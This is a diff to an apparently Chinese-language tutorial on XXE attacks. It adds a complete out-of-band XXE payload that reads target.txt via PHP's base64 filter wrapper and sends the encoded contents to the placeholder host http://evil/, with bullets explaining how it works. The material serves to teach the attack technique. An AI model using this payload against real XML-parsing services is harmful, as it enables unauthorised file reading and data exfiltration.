@@ -188,6 +188,19 @@
 %dtd;
 ```
 
+等同于:
+
+```xml
+<!DOCTYPE root SYSTEM [
+<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=target.txt">
+<!ENTITY % dtd "<!ENTITY send SYSTEM 'http://evil/?%xxe;'>">
+%dtd;
+]>
+<root>&send;</root>
+```
+
+
+
 * 最终结果来看，我们的目的是要发起请求http://evil/?想要读取的内容
 * 想要读取的内容就是php://filter/read=convert.base64-encode/resource=target.txt，target是我们想要读取的文件内容，这里默认目标主机是php语言，采用了php的xml外部实体引用所支持的php伪协议，伪协议中的convert.base64-encode/resource是对目标文件进行base64编码，防止出现预定义字符而解析出错（这里也可采用下面的方法防止出现预定义字符）
 
